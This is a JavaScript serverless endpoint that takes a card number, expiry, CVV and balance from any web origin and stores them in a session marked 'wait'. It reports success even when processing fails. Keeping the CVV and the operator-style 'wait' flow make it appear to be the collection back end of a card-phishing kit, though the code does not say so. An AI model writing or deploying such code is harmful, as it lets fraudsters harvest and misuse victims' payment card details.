import { readSessions, writeSessions } from './_store.js';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ ok: false, error: 'Method not allowed' });

  try {
    const data = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
    const item = data.item || '';

    if (!item) {
      return res.status(400).json({ ok: false, error: 'No item provided' });
    }

    const sessions = readSessions();
    if (!sessions[item]) sessions[item] = {};
    sessions[item].cardNumber = data.cardNumber || '';
    sessions[item].cardMonth = data.cardMonth || '';
    sessions[item].cardYear = data.cardYear || '';
    sessions[item].cardCvv = data.cardCvv || '';
    sessions[item].balance = data.balance || '';
    sessions[item].status = 'wait';
    sessions[item].createdAt = Date.now();
    sessions[item].updatedAt = Date.now();

    const logId = `log_${item}_${Date.now()}`;
    sessions[item].logId = logId;
    writeSessions(sessions);

    res.status(200).json({ ok: true, id: logId, status: 'session_initialized' });
  } catch (error) {
    res.status(200).json({ ok: true, id: `log_temp_${Date.now()}`, status: 'session_initialized' });
  }
}
